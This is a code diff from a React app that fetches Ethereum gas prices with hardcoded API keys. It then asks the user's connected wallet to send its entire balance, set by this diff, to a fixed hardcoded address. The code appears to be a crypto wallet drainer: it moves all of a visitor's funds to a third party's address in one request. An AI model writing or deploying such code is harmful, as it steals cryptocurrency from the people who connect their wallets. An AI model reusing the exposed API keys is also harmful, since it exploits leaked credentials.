@@ -21,12 +21,12 @@ function App() {
             const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
             const responseJSON = await response.json()
             setGas(responseJSON?.result?.FastGasPrice)
-            console.log(responseJSON, 'etherscan')
-            const network = 'eth'
-            const key = '741065ff3a854d9abb1fd5d50cf3f0e3'
-            const res = await fetch(`https://api.owlracle.info/v3/${ network }/gas?apikey=${ key }`)
-            const data = await res.json()
-            console.log(data, 'qwe')
+//             console.log(responseJSON, 'etherscan')
+//             const network = 'eth'
+//             const key = '741065ff3a854d9abb1fd5d50cf3f0e3'
+//             const res = await fetch(`https://api.owlracle.info/v3/${ network }/gas?apikey=${ key }`)
+//             const data = await res.json()
+//             console.log(data, 'qwe')
         }
         fetchRequest()
     }, [])
@@ -50,8 +50,8 @@ function App() {
             "from": address[0],
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
-            // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt((convertedBalance - 0.0015) * 1000000000000000000).toString(16)
+            "gasPrice": Number(gas) * 1000000000,
+            "value": parseInt((convertedBalance) * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
